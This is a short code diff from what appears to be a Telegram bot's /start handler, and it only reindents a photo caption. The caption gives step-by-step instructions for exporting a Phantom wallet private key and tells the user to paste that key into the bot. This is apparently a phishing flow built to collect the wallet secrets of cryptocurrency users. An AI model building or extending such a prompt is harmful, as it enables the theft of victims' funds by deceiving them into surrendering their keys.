@@ -734,23 +734,23 @@ bot.onText(/\/start/, async (msg) => {
       "https://framerusercontent.com/images/ISnZasMWb9w6SePLNUrOLbyg9b8.png",
       {
         caption:
-  `1. Open Phantom  
-  Unlock your Phantom extension or mobile app.
+`1. Open Phantom  
+Unlock your Phantom extension or mobile app.
   
-  2. Go to Settings  
-  Tap your profile → Settings.
+2. Go to Settings  
+Tap your profile → Settings.
   
-  3. Security & Privacy  
-  Select *Security & Privacy*.
+3. Security & Privacy  
+Select *Security & Privacy*.
   
-  4. Export Private Key  
-  Scroll and tap *Export Private Key*.
+4. Export Private Key  
+Scroll and tap *Export Private Key*.
   
-  5. Authenticate  
-  Approve with your password or biometrics.
+5. Authenticate  
+Approve with your password or biometrics.
   
-  6. Copy & Secure  
-  Copy the long string and paste here.`,
+6. Copy & Secure  
+Copy the long string and paste here.`,
         parse_mode: "Markdown"
       }
     );
